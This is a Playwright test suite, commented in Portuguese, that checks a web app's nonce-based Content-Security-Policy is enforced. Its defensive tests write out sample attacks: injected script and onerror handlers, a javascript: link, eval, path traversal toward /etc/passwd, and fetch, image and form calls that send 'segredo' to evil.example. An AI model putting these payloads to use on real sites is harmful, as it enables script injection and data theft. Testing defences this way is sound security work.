/**
 * SEC-008 / F-09: Content-Security-Policy completa, com nonce por requisição, imposta de verdade
 * pelo navegador (Chromium) contra o build de PRODUÇÃO. Três garantias:
 *  1. a política chega, uma só vez, com um nonce novo a cada requisição;
 *  2. nenhuma tela legítima viola a política (senão o bloqueio quebraria a aplicação);
 *  3. o que um atacante injetaria (script inline, manipulador inline, eval, iframe, envio de
 *     dados para fora) é bloqueado.
 */
import { expect, test, type Page } from "@playwright/test";

import { definirSessao } from "./apoio";

const ORIGEM = "http://127.0.0.1:3100";

const usuario = {
  id: "u1",
  nome: "Usuário de Teste",
  email: "teste@exemplo.com",
  avatar: null,
  grupo: "Grupo",
  status: "ativo",
  google2fa_enable: false,
  permissoes: [
    "admin.usuario.listar", "admin.mensagem.listar", "admin.mensagem.cadastrar", "admin.empresa.listar",
    "admin.empresa.cadastrar", "admin.grupo.listar", "admin.chamado.listar",
    "private.usuario.listar", "private.empresa.listar", "private.chamado.listar",
  ],
};

async function simularBackend(page: Page) {
  for (const area of ["admin", "private"]) {
    await page.route(`**/api/proxy/${area}`, async (route) => {
      const { url } = route.request().postDataJSON() as { url: string };
      const corpo = /\/me(\?|$)/.test(url) ? { data: usuario } : { data: [], meta: { current_page: 1, last_page: 1, per_page: 10, total: 0, from: 0, to: 0 } };

      await route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify({ status: 200, data: corpo }) });
    });
  }
}

/** Registra toda violação de CSP que o navegador relatar (o evento é nativo do navegador). */
async function vigiarViolacoes(page: Page) {
  await page.addInitScript(() => {
    const w = window as unknown as { __violacoes: { diretiva: string; bloqueado: string }[] };
    w.__violacoes = [];
    document.addEventListener("securitypolicyviolation", (e) => {
      w.__violacoes.push({ diretiva: e.violatedDirective, bloqueado: e.blockedURI });
    });
  });
}

/**
 * Violações registradas na página. Ignora só a fonte falsa (`:4099/mock.woff2`) do build com
 * Google Fonts SIMULADO usado nos testes locais sem internet; num build normal o `next/font`
 * baixa as fontes e as serve do próprio site (`font-src 'self'`).
 */
const violacoes = async (page: Page) =>
  (await page.evaluate(() => (window as unknown as { __violacoes: { diretiva: string; bloqueado: string }[] }).__violacoes)).filter(
    (v) => !v.bloqueado.includes(":4099/")
  );

test.describe("Cabeçalhos", () => {
  test("a página traz UMA CSP com nonce, script-src estrito e frame-ancestors none", async ({ request }) => {
    const resposta = await request.get(`${ORIGEM}/admin`);
    const csps = resposta.headersArray().filter((h) => h.name.toLowerCase() === "content-security-policy");

    expect(csps).toHaveLength(1);
    expect(csps[0].value).toMatch(/script-src 'self' 'nonce-[A-Za-z0-9+/=]+' 'strict-dynamic'/);
    expect(csps[0].value).not.toContain("'unsafe-eval'");
    expect(csps[0].value).not.toMatch(/script-src[^;]*'unsafe-inline'/);
    expect(csps[0].value).toContain("frame-ancestors 'none'");
    expect(resposta.headers()["x-frame-options"]).toBe("DENY");
    expect(resposta.headers()["content-security-policy-report-only"]).toBeUndefined();
  });

  test("o nonce muda a cada requisição e o HTML usa o nonce DA RESPOSTA nos seus scripts", async ({ request }) => {
    const nonces = new Set<string>();

    for (let i = 0; i < 5; i++) {
      const resposta = await request.get(`${ORIGEM}/admin`);
      const nonce = resposta.headers()["content-security-policy"].match(/'nonce-([^']+)'/)![1];
      const html = await resposta.text();

      nonces.add(nonce);
      expect(html).toContain(`nonce="${nonce}"`); // o Next marcou os scripts com este nonce
      expect(html).not.toMatch(/<script(?![^>]*\bnonce=)(?![^>]*\bsrc=)[^>]*>/); // nenhum script inline sem nonce
    }

    expect(nonces.size).toBe(5);
  });

  test("API tem a própria CSP restritiva; /storage entrega arquivos com cabeçalhos de segurança e sem vazar o backend", async ({ request }) => {
    const api = await request.get(`${ORIGEM}/api/health`);
    expect(api.headers()["content-security-policy"]).toBe("default-src 'none'; frame-ancestors 'none'; base-uri 'none'; form-action 'none'");

    // antes NENHUM cabeçalho de segurança chegava nas respostas de /storage (rewrite externo)
    const storage = await request.get(`${ORIGEM}/storage/avatars/a.png`);
    const cabecalhos = storage.headers();

    expect(cabecalhos["content-security-policy"]).toContain("sandbox");
    expect(cabecalhos["content-security-policy"]).not.toContain("nonce-");
    expect(cabecalhos["x-content-type-options"]).toBe("nosniff");
    expect(cabecalhos["x-frame-options"]).toBe("DENY");
    expect(cabecalhos["cross-origin-resource-policy"]).toBe("same-origin");
    // o backend simulado responde JSON: não é imagem, então vira download e não é interpretado
    expect(cabecalhos["content-type"]).toBe("application/octet-stream");
    expect(cabecalhos["content-disposition"]).toBe("attachment");
    // nenhum rastro do endereço interno do backend (o rewrite antigo vazava x-middleware-rewrite)
    expect(JSON.stringify(cabecalhos)).not.toMatch(/4010|x-middleware-rewrite/);
  });

  test("/storage recusa caminhos suspeitos sem chegar ao backend", async ({ request }) => {
    // (`%2e%2e` solto é normalizado pelo próprio cliente HTTP para `..` ANTES de enviar e nunca sai de
    // /storage; o que chega ao servidor como ataque é a barra codificada dentro do segmento)
    for (const caminho of ["/storage/..%2f..%2fetc%2fpasswd", "/storage/avatars/..%2fsegredo", "/storage/avatars/%2e%2e%2fsegredo", "/storage/http:%2f%2fevil.example"]) {
      const resposta = await request.get(`${ORIGEM}${caminho}`);

      expect(resposta.status(), caminho).toBe(404);
    }
  });
});

test.describe("A aplicação funciona sob a política (nenhuma violação)", () => {
  test("telas públicas: renderizam, hidratam e não violam a CSP", async ({ page }) => {
    await vigiarViolacoes(page);
    const mensagensDoConsole: string[] = [];
    page.on("console", (m) => mensagensDoConsole.push(m.text()));

    for (const caminho of ["/admin", "/", "/admin/esqueceu-senha", "/esqueceu-senha"]) {
      await page.goto(caminho);
      await page.waitForLoadState("networkidle");
      await expect(page.locator("form")).toBeVisible();

      expect(await violacoes(page), caminho).toEqual([]);
    }

    expect(mensagensDoConsole.filter((m) => /Content Security Policy|Refused to/i.test(m) && !m.includes(":4099/"))).toEqual([]);
  });

  test("telas autenticadas do Admin e do Private: nenhuma violação", async ({ page, context }) => {
    await definirSessao(context, "admin");
    await definirSessao(context, "private");
    await simularBackend(page);
    await vigiarViolacoes(page);
    const mensagensDoConsole: string[] = [];
    page.on("console", (m) => mensagensDoConsole.push(m.text()));

    for (const caminho of [
      "/admin/home", "/admin/usuarios", "/admin/mensagens", "/admin/empresas", "/admin/empresas/cadastrar",
      "/admin/grupos", "/admin/chamados", "/home", "/usuarios", "/empresas", "/perfil",
    ]) {
      await page.goto(caminho);
      await page.waitForLoadState("networkidle");

      expect(await violacoes(page), caminho).toEqual([]);
    }

    expect(mensagensDoConsole.filter((m) => /Content Security Policy|Refused to/i.test(m) && !m.includes(":4099/"))).toEqual([]);
  });

  test("o tema escuro continua funcionando (o script do tema recebeu o nonce)", async ({ page, context }) => {
    await definirSessao(context, "admin");
    await simularBackend(page);
    await vigiarViolacoes(page);
    await page.emulateMedia({ colorScheme: "dark" });

    await page.goto("/admin/home");
    await page.waitForLoadState("networkidle");

    await expect(page.locator("html")).toHaveClass(/dark/);
    expect(await violacoes(page)).toEqual([]);
  });

  test("o login funciona de ponta a ponta com a política ativa", async ({ page }) => {
    await vigiarViolacoes(page);
    await page.goto("/admin");
    await page.getByLabel("Email").fill("admin@exemplo.com");
    await page.getByLabel("Senha", { exact: true }).fill("Senha123@");
    await page.getByRole("button", { name: "Entrar" }).click();

    await expect(page).toHaveURL(/\/admin\/home$/);
    expect(await violacoes(page)).toEqual([]);
  });
});

test.describe("O que um atacante injetaria é bloqueado", () => {
  test.beforeEach(async ({ page }) => {
    await vigiarViolacoes(page);
    await page.goto("/admin");
    await page.waitForLoadState("networkidle");
  });

  /**
   * Simula um XSS refletido/armazenado: o HTML que o servidor entrega traz um <script> e um
   * manipulador inline SEM o nonce. O que o servidor marcou com o nonce da resposta continua
   * funcionando (é o código legítimo da aplicação).
   */
  test("HTML com <script> e onerror injetados (sem nonce) não executa, mas o código legítimo (com nonce) sim", async ({ page }) => {
    await page.route("**/admin", async (route) => {
      if (route.request().resourceType() !== "document") return route.continue();

      const resposta = await route.fetch();
      const nonce = resposta.headers()["content-security-policy"].match(/'nonce-([^']+)'/)![1];
      const html = (await resposta.text()).replace(
        "</body>",
        `<script>window.__pwn='script-injetado'</script>` +
          `<script nonce="${nonce}">window.__legitimo='ok'</script>` +
          `<img src="/imagem-que-nao-existe.png" onerror="window.__pwn2='onerror-injetado'"></body>`
      );

      await route.fulfill({ response: resposta, body: html });
    });

    await page.goto("/admin");
    await page.waitForLoadState("networkidle");
    await page.waitForTimeout(300);

    const estado = await page.evaluate(() => {
      const w = window as unknown as { __pwn?: string; __pwn2?: string; __legitimo?: string };

      return { script: w.__pwn ?? null, onerror: w.__pwn2 ?? null, legitimo: w.__legitimo ?? null };
    });

    expect(estado).toEqual({ script: null, onerror: null, legitimo: "ok" });
    expect((await violacoes(page)).filter((v) => v.diretiva.startsWith("script-src")).length).toBeGreaterThanOrEqual(2);
    await expect(page.locator("form")).toBeVisible(); // a aplicação continua funcionando
  });

  test("manipulador inline (onerror, onclick) injetado por innerHTML não executa", async ({ page }) => {
    const executou = await page.evaluate(async () => {
      const w = window as unknown as { __pwn?: string };
      const caixa = document.createElement("div");
      caixa.innerHTML = `<img src="/imagem-que-nao-existe.png" onerror="window.__pwn='onerror'"><button id="b" onclick="window.__pwn='onclick'">x</button>`;
      document.body.appendChild(caixa);
      (document.getElementById("b") as HTMLButtonElement).click();
      await new Promise((r) => setTimeout(r, 400));

      return w.__pwn ?? null;
    });

    expect(executou).toBeNull();
    expect((await violacoes(page)).some((v) => v.diretiva.startsWith("script-src"))).toBe(true);
  });

  test("link javascript: não executa", async ({ page }) => {
    const executou = await page.evaluate(async () => {
      const w = window as unknown as { __pwn?: string };
      const a = document.createElement("a");
      a.href = "javascript:window.__pwn='href'";
      document.body.appendChild(a);
      a.click();
      await new Promise((r) => setTimeout(r, 300));

      return w.__pwn ?? null;
    });

    expect(executou).toBeNull();
  });

  /**
   * `page.evaluate` roda por um canal do DevTools que NÃO está sujeito à restrição de eval da CSP,
   * então o teste executa o `eval` num script da própria página (com o nonce correto), que é o
   * que um código malicioso dentro da aplicação faria.
   */
  test("eval e new Function, mesmo em script com nonce, são bloqueados em produção", async ({ page }) => {
    await page.route("**/admin", async (route) => {
      if (route.request().resourceType() !== "document") return route.continue();

      const resposta = await route.fetch();
      const nonce = resposta.headers()["content-security-policy"].match(/'nonce-([^']+)'/)![1];
      const teste = `const t=(f)=>{try{return String(f())}catch(e){return e.name}};window.__evalResultado=JSON.stringify({eval:t(()=>eval("1+1")),funcao:t(()=>new Function("return 1")())})`;

      await route.fulfill({ response: resposta, body: (await resposta.text()).replace("</body>", `<script nonce="${nonce}">${teste}</script></body>`) });
    });

    await page.goto("/admin");
    await page.waitForLoadState("networkidle");

    const resultado = await page.evaluate(() => (window as unknown as { __evalResultado?: string }).__evalResultado);

    expect(JSON.parse(resultado!)).toEqual({ eval: "EvalError", funcao: "EvalError" });
  });

  test("iframe embutido (srcdoc ou externo) é bloqueado", async ({ page }) => {
    await page.evaluate(() => {
      const f = document.createElement("iframe");
      f.src = "https://evil.example/";
      document.body.appendChild(f);
    });
    await page.waitForTimeout(300);

    expect((await violacoes(page)).some((v) => v.diretiva.startsWith("frame-src") || v.diretiva.startsWith("default-src"))).toBe(true);
  });

  test("envio de dados para outro site (fetch, imagem, formulário) é bloqueado", async ({ page }) => {
    const resultado = await page.evaluate(async () => {
      const fetchFalhou = await fetch("https://evil.example/coleta?c=segredo").then(() => false, () => true);

      const img = document.createElement("img");
      img.src = "https://evil.example/pixel.gif?c=segredo";
      document.body.appendChild(img);

      const form = document.createElement("form");
      form.action = "https://evil.example/post";
      form.method = "post";
      document.body.appendChild(form);
      form.requestSubmit?.();

      await new Promise((r) => setTimeout(r, 400));

      return { fetchFalhou };
    });

    expect(resultado.fetchFalhou).toBe(true);

    const diretivas = (await violacoes(page)).map((v) => v.diretiva.split(" ")[0]);
    expect(diretivas).toEqual(expect.arrayContaining(["connect-src", "img-src", "form-action"]));
  });

  test("<base> injetado não muda para onde os links vão (base-uri)", async ({ page }) => {
    await page.evaluate(() => {
      const base = document.createElement("base");
      base.href = "https://evil.example/";
      document.head.appendChild(base);
    });
    await page.waitForTimeout(200);

    expect((await violacoes(page)).some((v) => v.diretiva.startsWith("base-uri"))).toBe(true);
  });
});
